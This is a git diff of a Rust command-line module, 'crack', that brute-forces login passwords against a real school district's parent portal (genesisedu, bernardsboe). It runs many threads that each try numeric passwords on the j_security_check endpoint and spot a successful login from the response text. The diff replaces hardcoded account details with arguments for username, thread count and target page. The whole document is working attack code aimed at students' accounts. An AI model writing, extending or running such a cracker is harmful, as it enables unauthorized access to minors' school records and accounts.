@@ -1,52 +1,88 @@
+// STD modules
 use std::io::Write;
 use std::thread;
 use std::time::Duration;
 use std::time::SystemTime;
+
+// External Crates
+use regex::Regex;
 use ureq::Agent;
 
+// Internal Modules
+use super::super::arg_parse;
 use super::color;
 use super::color::Color;
 use super::Command;
 
-// Define Some Constants
-static THREADS: u32 = 16;
-static BASE_URL: &str = "https://parents.genesisedu.com/bernardsboe";
-static USERNAME: &str = "@bernardsboe.com";
-static PASSWORD: &str = "30####";
-
-static mut RUNNING: bool = true;
+// This took too long to make...
+static SPINNER: [char; 10] = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
+static mut FOUND: bool = false;
+static mut RUNNING: i32 = 0;
+static mut TRIED: u32 = 0;
 
 pub fn command() -> Command {
     Command::new(
         "crack",
         "Crack A password",
-        "crack student@bernardsboe.com",
+        "crack <username> [-t Threads] [--page BasePage]",
         |args| {
             if args.len() <= 2 {
-                color_print!(Color::Red, "[*] Not enough args suplied");
+                color_print!(Color::Red, "[*] Not enough args supplied");
                 return;
+            }
+
+            // Parse the args
+            let threads: &u32 = &arg_parse::get_arg_value(&args, "-t")
+                .unwrap_or("16")
+                .parse::<u32>()
+                .unwrap();
+
+            let base_page: &str = &arg_parse::get_arg_value(&args, "--page")
+                .unwrap_or("https://parents.genesisedu.com/bernardsboe");
+
+            // Get Username
+            let mut username: String = "".to_string();
+            let mut i = 2;
+            while i < args.len() {
+                if args[i].starts_with('-') {
+                    i += 2;
+                    continue;
+                }
+                username = (&args[i]).to_string();
+                break;
+            }
+            if username.is_empty() {
+                color_print!(Color::Red, "[-] No username supplied");
+                return;
+            }
+            let email = Regex::new(r"[^@ \t\r\n]+@[^@ \t\r\n]+\.[^@ \t\r\n]+").unwrap();
+            if !email.is_match(&username) {
+                color_print!(
+                    Color::Red,
+                    "[-] The username supplied is not a valid Email..."
+                );
             }
 
             color_print!(
                 Color::Green,
                 "\n[*] Starting Crack on {}",
-                &color::color(&args[2], Color::Blue)
+                &color::color(&username, Color::Blue)
             );
 
+            color_print!(Color::Magenta, "[i] Threads: {}", &threads.to_string());
+            color_print!(Color::Magenta, "[i] Base Page: {}", &base_page);
+            println!();
+
             // C R A C K
-            crack();
+            crack(&username, *threads as u32, base_page);
         },
     )
 }
-
-// This took too long to make...
-static SPINNER: [char; 10] = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
 
 struct Cracker {
     instance: u32,
     end_index: u32,
     start_index: u32,
-    password: String,
     username: String,
     base_url: String,
 }
@@ -57,7 +93,6 @@ impl Cracker {
         instance: u32,
         end_index: u32,
         start_index: u32,
-        password: &str,
         username: &str,
         base_url: &str,
     ) -> Cracker {
@@ -65,7 +100,6 @@ impl Cracker {
             instance,
             end_index,
             start_index,
-            password: password.to_string(),
             username: username.to_string(),
             base_url: base_url.to_string(),
         }
@@ -76,14 +110,13 @@ impl Cracker {
             instance: self.instance,
             end_index: self.end_index,
             start_index: self.start_index,
-            password: self.password,
             username: self.username,
             base_url: self.base_url,
         }
     }
     fn start(&self) {
         // Login Page
-        let page: &str = &format!("{}/sis/j_security_check", BASE_URL);
+        let page: &str = &format!("{}/sis/j_security_check", self.base_url);
 
         let mut i: u32 = self.start_index as u32;
         while i < self.end_index {
@@ -95,9 +128,9 @@ impl Cracker {
 
             // Refresh Token
             agent
-                .get(&format!("{}/sis/view", BASE_URL))
+                .get(&format!("{}/sis/view", self.base_url))
                 .call()
-                .unwrap_or(ureq::Response::new(500, "", "").unwrap());
+                .unwrap_or_else(|_| ureq::Response::new(500, "", "").unwrap());
 
             // Send Username and Password attempt to server
             let body = match agent
@@ -106,11 +139,14 @@ impl Cracker {
                 .query("j_password", to_try)
                 .call()
             {
-                Ok(body) => body.into_string().expect("Error Reading Server Response"),
+                Ok(body) => body.into_string().unwrap_or_else(|_| "".to_string()),
                 Err(_) => continue,
             };
 
             i += 1;
+            unsafe {
+                TRIED += 1;
+            }
 
             // If not logged in try next password
             if !body.contains("Account is inactive") && !body.contains("workStudentId") {
@@ -124,8 +160,12 @@ impl Cracker {
             );
 
             unsafe {
-                RUNNING = false;
+                RUNNING = 0;
+                FOUND = true;
             }
+        }
+        unsafe {
+            RUNNING -= 1;
         }
     }
 }
@@ -151,29 +191,32 @@ impl System {
     }
 }
 
-pub fn crack() {
+pub fn crack(username: &str, threads: u32, base_url: &str) {
     // Start Timer
     let start_time = SystemTime::now();
 
     // Make a new System
-    let mut system: System = System::new(9999, THREADS);
+    let mut system: System = System::new(9999, threads);
 
+    unsafe {
+        RUNNING = threads as i32;
+    }
     for i in 0..system.threads {
-        let start_index = system.passwords / THREADS as u32;
+        let start_index = system.passwords / system.threads as u32;
         let mut end_index = start_index * (i + 1);
-        if i == THREADS - 1 {
+        if i == system.threads - 1 {
             end_index = system.passwords as u32;
         }
         system.add_cracker(Cracker::new(
             i,
             end_index,
             start_index * i,
-            PASSWORD,
-            USERNAME,
-            BASE_URL,
+            username,
+            base_url,
         ));
     }
 
+    // Start the Threads
     for i in system.crackers {
         let cracker = i.clone();
         thread::spawn(move || {
@@ -181,19 +224,28 @@ pub fn crack() {
         });
     }
 
-    while unsafe { RUNNING } {
+    while unsafe { RUNNING } > 0 {
         for i in SPINNER.iter() {
-            if unsafe { !RUNNING } {
+            if unsafe { RUNNING } <= 0 {
                 break;
             }
             print!(
-                "{}",
-                color::color(&format!("\r[{}] Cracking...", &i.to_string()), Color::Cyan)
+                "{} {}",
+                color::color(&format!("\r[{}] Cracking", &i.to_string()), Color::Cyan),
+                color::color(
+                    &format!("( {}% )", (unsafe { TRIED } as f32 / 9999.0 * 100.0) as u32),
+                    Color::Blue
+                )
             );
             std::io::stdout().flush().expect("Err flushing STD Out");
             thread::sleep(Duration::from_millis(100));
         }
     }
+    
+    if unsafe { !FOUND } {
+        color_print!(Color::Red, "\r[*] No Password Found :/");
+    }
+
     color_print!(
         Color::Green,
         "\n[*] All Done - Took {}s",
